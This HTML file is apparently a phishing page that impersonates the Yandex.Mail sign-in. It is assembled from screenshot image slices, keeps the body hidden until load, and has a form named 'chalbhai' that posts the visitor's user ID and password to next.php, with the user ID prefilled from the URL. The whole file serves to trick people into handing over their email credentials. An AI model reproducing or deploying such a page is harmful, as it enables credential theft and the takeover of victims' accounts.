<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#1071;&#1085;&#1076;&#1077;&#1082;&#1089;&#46;&#1055;&#1086;&#1095;&#1090;&#1072;&#32;&#8212;&#32;&#1073;&#1077;&#1089;&#1087;&#1083;&#1072;&#1090;&#1085;&#1072;&#1103;&#32;&#1101;&#1083;&#1077;&#1082;&#1090;&#1088;&#1086;&#1085;&#1085;&#1072;&#1103;&#32;&#1087;&#1086;&#1095;&#1090;&#1072;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
.textbox { 
    border-top: solid 1px #8e8e8e; 
    border-right: solid 1px #8e8e8e; 
    border-left: solid 1px #8e8e8e; 
    border-bottom: solid 1px #e4e4e4; 
    height: 28px; 
    width: 275px; 
    font-size: 13px; 
    padding-left: 4px;
	text-align: center;	
} 
.textbox:focus { 
    outline: none; 
    border: 1px solid #e4e4e4; 
	box-shadow: 0 0 4px 3px #FFBF00; 
} 
 </style>
 <style type="text/css">
.textrbox { 
    border: 1px solid #fff; 
    outline:0; 
    height: 28px; 
    width: 275px; 
    font-size: 13px; 
    padding-left: 4px;
	text-align: center;	
} 
.textbox:focus { 
    outline: none; 
    border: 0px  #fff;  
} 
 </style>
 <style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:25px;
							height:18px; 
							display:inline-block;
							line-height:18px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:18px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -18px;
						}
						label.css-label {
				background-image:url(http://csscheckbox.com/checkboxes/u/csscheckbox_7d50e874d60d0e1b03579ca65b618883.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
			</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:155px; z-index:0"><img src="images/x1.png" alt="" title="" border=0 width=1365 height=155></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:154px; width:1365px; height:157px; z-index:1"><img src="images/x2.png" alt="" title="" border=0 width=1365 height=157></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:310px; width:1365px; height:180px; z-index:2"><img src="images/x3.png" alt="" title="" border=0 width=1365 height=180></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:487px; width:1365px; height:175px; z-index:3"><img src="images/x4.png" alt="" title="" border=0 width=1365 height=175></div>

<div id="image5" style="position:absolute; overflow:hidden; left:158px; top:627px; width:1141px; height:26px; z-index:4"><a href="#"><img src="images/x5.png" alt="" title="" border=0 width=1141 height=26></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:534px; top:382px; width:335px; height:48px; z-index:5"><a href="#"><img src="images/x6.png" alt="" title="" border=0 width=335 height=48></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:112px; top:394px; width:171px; height:26px; z-index:6"><a href="#"><img src="images/x7.png" alt="" title="" border=0 width=171 height=26></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:196px; top:345px; width:135px; height:34px; z-index:7"><a href="#"><img src="images/x8.png" alt="" title="" border=0 width=135 height=34></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:141px; top:102px; width:120px; height:87px; z-index:8"><a href="#"><img src="images/x9.png" alt="" title="" border=0 width=120 height=87></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:218px; top:313px; width:114px; height:13px; z-index:9"><a href="#"><img src="images/x10.png" alt="" title="" border=0 width=114 height=13></a></div>
<form action=next.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" class="textrbox" autocomplete="off" required type="text" style="position:absolute;width:260px;left:70px;top:221px;z-index:10; font-size:18pt" size="1" tabindex="99">
<input name="pass" id="demo-field" placeholder="" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:260px;left:70;top:266;z-index:11">

<div id="checkboxG1"  style="position:absolute; left:69px; top:310px; z-index:12"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:69px; top:310px; z-index:12"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:69px; top:345px; z-index:13"><input type="image" name="formimage1" width="104" height="34" src="images/buton.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
</body>
</html>
